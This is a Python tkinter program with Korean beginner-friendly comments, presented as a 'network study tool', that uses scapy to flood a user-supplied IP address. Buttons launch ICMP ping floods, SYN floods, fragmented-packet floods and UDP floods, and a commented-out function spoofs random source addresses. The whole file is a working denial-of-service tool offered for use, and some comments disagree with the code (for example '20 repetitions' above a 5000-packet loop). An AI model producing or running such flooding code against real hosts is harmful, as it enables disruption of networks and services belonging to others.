import tkinter as tk          # 화면에 창을 띄울 때 쓰는 도구예요.
from scapy.all import * # 네트워크 패킷(가짜 편지)을 만드는 핵심 도구예요.
import random                 # 숫자를 무작위(랜덤)로 뽑을 때 써요.
import time                   # 컴퓨터를 잠시 기다리게 할 때(쉬어갈 때) 써요.

# ==========================================
# 1. 화면(창) 만들기
# ==========================================
window = tk.Tk()
window.title("초보자의 네트워크 공부 도구") # 프로그램 맨 위 제목
window.geometry("500x700")                # 창 크기 (가로 500, 세로 600)

# 안내 글자 써주기
label1 = tk.Label(window, text="연습할 대상의 IP주소를 적어주세요:")
label1.pack(pady=5)

# 주소를 입력받는 하얀 칸 만들기
ip_input = tk.Entry(window, width=20, font=("Segoe UI", 12))
ip_input.pack(pady=5)
ip_input.insert(0, "192.168.0.1") # 기본으로 내 컴퓨터 주소를 적어뒀어요.
ip_input.pack(pady=14)

# 무슨 일이 일어나는지 보여주는 노란색 글자창
log_box = tk.Text(window, width=60, height=30, bg="#FFF6C1", fg="black")
log_box.pack(pady=10)

# 로그창에 글자를 한 줄씩 써주는 고마운 함수예요.
def write_log(text):
    log_box.insert(tk.END, text + "\n") # 글자를 끝에 추가해요.
    log_box.see(tk.END)                # 글자가 많아지면 자동으로 아래를 보여줘요.

# ==========================================
# 2. 기능들 만들기 (버튼을 누르면 실행돼요)
# ==========================================

# [기능 1] 안부 인사(ICMP) 폭탄
def icmp_attack():
    target = ip_input.get() # 입력창에 적힌 주소를 가져와요.
    write_log(f"ICMP 폭탄 던지는 중... 대상: {target}")

    # IP()는 편지 봉투고, ICMP()는 "안녕?"이라는 편지 내용이에요.
    packet = IP(dst=target) / ICMP()

    for i in range(5000): # 20번 반복해서 보내볼게요.
        send(packet, verbose=False) # 편지 보내기 (verbose=False는 조용히 보내라는 뜻!)
        if i % 1000 == 0:
            write_log(f"전송 중... ({i}/5000)")
            window.update() # GUI가 멈추지 않게 살짝 갱신
    # 반복문(for)이 다 끝나고 나서 실행돼요!
    write_log(">>> ICMP 공격 완료!!")

# [기능 2] 연결 요청(SYN) 폭탄
def syn_attack():
    target = ip_input.get()
    write_log(f"SYN 폭탄 던지는 중... 대상: {target}")

    # TCP(flags="S")는 "우리 대화하자!"라고 말 거는 거예요.
    # dport=80은 보통 인터넷 홈페이지가 사용하는 문(포트)이에요.
    packet = IP(dst=target) / TCP(dport=80, flags="S")

    for i in range(2000):
        send(packet, verbose=False)
        if i % 200 == 0:
            write_log(f"연결 요청 중... ({i}/2000)")
            # GUI가 멈추지 않도록 화면을 강제 갱신합니다.
            window.update()
    write_log(">>> SYN 공격 완료!!")

# # [기능 3] 내 주소 속이기 (IP 스푸핑)
# def spoof_attack():
#     target = ip_input.get()
#     write_log(f"가짜 주소로 변장해서 보내는 중...")
#
#     for i in range(5):
#         # 1부터 254 사이의 숫자 4개를 뽑아서 '1.2.3.4' 같은 주소를 만들어요.
#         a = str(random.randint(1, 254))
#         b = str(random.randint(1, 254))
#         c = str(random.randint(1, 254))
#         d = str(random.randint(1, 254))
#         fake_ip = a + "." + b + "." + c + "." + d
#
#         # src(보내는 사람) 자리에 내가 만든 가짜 주소를 적어요!
#         packet = IP(src=fake_ip, dst=target) / TCP(dport=80, flags="S")
#         send(packet, verbose=False)
#         write_log(f"[{fake_ip}] 인 척하고 편지 보냄!")
#     write_log(">>> 주소 속이기 완료!!")

# [기능 4] 패킷 조각조각 내기
def frag_attack():
    target = ip_input.get()
    write_log("데이터 조각조각 나눠서 보내기 시작!")

    # 'A'라는 글자를 2000개나 쓴 아주 무거운 편지를 준비해요.
    big_data = "A" * 2000
    packet = IP(dst=target) / ICMP() / big_data

    # fragment라는 도구를 쓰면 큰 편지를 작은 조각(600바이트씩)으로 잘라줘요.
    small_pieces = fragment(packet, fragsize=600)

    for i in range(500):
        for p in small_pieces:
            send(p, verbose=False)

        # 4. [중요] time.sleep(0.1)을 삭제하여 전송 속도를 극대화합니다.

        # 5. 50세트마다 한 번씩만 화면을 갱신합니다.
        if i % 50 == 0:
            write_log(f"조각 패킷 세트 전송 중... ({i}/500)")
            window.update()

    write_log(">>> 패킷 쪼개기 공격 완료!!")

# [기능 5] UDP 쓰레기 던지기
def udp_attack():
    target = ip_input.get()
    write_log("UDP 쓰레기 데이터 던지기 시작!")

    for i in range(2000):
        # 1000번부터 2000번 사이의 아무 문(포트)으로나 던져요.
        random_port = random.randint(1000, 2000)
        # 내용물은 그냥 "쓰레기 데이터"라고 적은 편지예요.
        packet = IP(dst=target) / UDP(dport=random_port) / "쓰레기 데이터"
        send(packet, verbose=False)
        if i % 200 == 0:
            write_log(f"쓰레기 데이터 던지는 중... ({i}/2000)")
            window.update() # GUI 멈춤 방지
    write_log(">>> UDP 공격 완료!!")

# ==========================================
# 3. 버튼 만들기 (누르면 위 기능들이 실행돼요)
# ==========================================

# 'command=' 다음에 아까 만든 함수 이름을 적어주면 버튼과 연결돼요!


# -----------------------------------------
btn_style = {
    "bg": "#CFF2D8",              # 파스텔 그린
    "fg": "#2f4f3f",
    "activebackground": "#B7E8C4",
    "activeforeground": "#1f3a2d",

    # 테두리
    "bd": 1,
    "relief": "solid",
    "highlightthickness": 1,
    "highlightbackground": "#8FC9A3",
    "highlightcolor": "#8FC9A3",

    "font": ("Segoe UI", 10, "bold"),
    "height": 3,
    "cursor": "hand2"
}

# 상부와의 간격 (조금 줄여서 위로 올림)
spacer = tk.Frame(window, height=100)   # 기존 60 → 40
spacer.pack(side="bottom")

# 하단 툴바 (살짝 위로)
toolbar = tk.Frame(window, bg=window["bg"])
toolbar.pack(side="bottom", pady=14)   # 기존 20 → 14

tk.Button(toolbar, text="핑 폭탄 (ICMP)", command=icmp_attack, **btn_style) \
    .pack(side="left", padx=8)
tk.Button(toolbar, text="연결폭탄 (SYN)", command=syn_attack, **btn_style) \
    .pack(side="left", padx=8)
tk.Button(toolbar, text="조각내기 (FRAG)", command=frag_attack, **btn_style) \
    .pack(side="left", padx=8)
tk.Button(toolbar, text="UDP 던지기", command=udp_attack, **btn_style) \
    .pack(side="left", padx=8)



# tk.Button(window, text="1. 인사폭탄 (ICMP)", command=icmp_attack, bg="lightblue").pack(fill="x", pady=2)
# tk.Button(window, text="2. 연결폭탄 (SYN)", command=syn_attack, bg="lightgreen").pack(fill="x", pady=2)
# tk.Button(window, text="3. 조각내기 (Fragment)", command=frag_attack, bg="lightpink").pack(fill="x", pady=2)
# tk.Button(window, text="4. UDP 던지기", command=udp_attack, bg="lightgray").pack(fill="x", pady=2)

# 화면을 계속 띄워두고 기다리는 명령어예요.
window.mainloop()